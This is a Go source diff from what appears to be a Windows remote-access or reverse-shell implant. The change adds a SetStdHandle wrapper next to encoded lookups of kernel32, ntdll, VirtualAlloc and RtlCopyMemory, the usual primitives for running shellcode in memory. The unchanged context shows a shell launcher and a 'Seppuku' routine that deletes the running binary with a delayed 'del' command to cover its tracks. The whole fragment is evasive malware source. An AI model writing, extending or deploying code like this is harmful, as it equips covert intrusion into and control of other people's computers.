@@ -21,11 +21,24 @@ const (
 )
 
 var (
-	kernel32      = syscall.MustLoadDLL(utils.Bake("EwYGFgYYS1FaHA8Y"))
-	ntdll         = syscall.MustLoadDLL(utils.Bake("FhcQFA9aHA8Y"))
-	VirtualAlloc  = kernel32.MustFindProc(utils.Bake("LgoGDBYVFCIYFAwX"))
-	RtlCopyMemory = ntdll.MustFindProc(utils.Bake("KhcYOwwEAS4RFQwGAQ=="))
+	kernel32         = syscall.MustLoadDLL(utils.Bake("EwYGFgYYS1FaHA8Y"))
+	ntdll            = syscall.MustLoadDLL(utils.Bake("FhcQFA9aHA8Y"))
+	VirtualAlloc     = kernel32.MustFindProc(utils.Bake("LgoGDBYVFCIYFAwX"))
+	RtlCopyMemory    = ntdll.MustFindProc(utils.Bake("KhcYOwwEAS4RFQwGAQ=="))
+	procSetStdHandle = kernel32.MustFindProc(utils.Bake("KwYAKxcQMAIaHA8R"))
 )
+
+// SetStdHandle https://docs.microsoft.com/de-de/windows/console/setstdhandle
+func SetStdHandle(stdhandle int32, handle syscall.Handle) error {
+	r0, _, e1 := syscall.Syscall(procSetStdHandle.Addr(), 2, uintptr(stdhandle), uintptr(handle), 0)
+	if r0 == 0 {
+		if e1 != 0 {
+			return error(e1)
+		}
+		return syscall.EINVAL
+	}
+	return nil
+}
 
 // Shell ...
 func Shell() *exec.Cmd {
@@ -194,6 +207,7 @@ func Seppuku(c net.Conn) {
 	fmt.Println(binPath)
 	go Exec(fmt.Sprintf("ping localhost -n 5 > nul & del %s", binPath), c)
 }
+
 
 func StartSSHServer(port int, c net.Conn) {
 	fmt.Println("Not implemented")
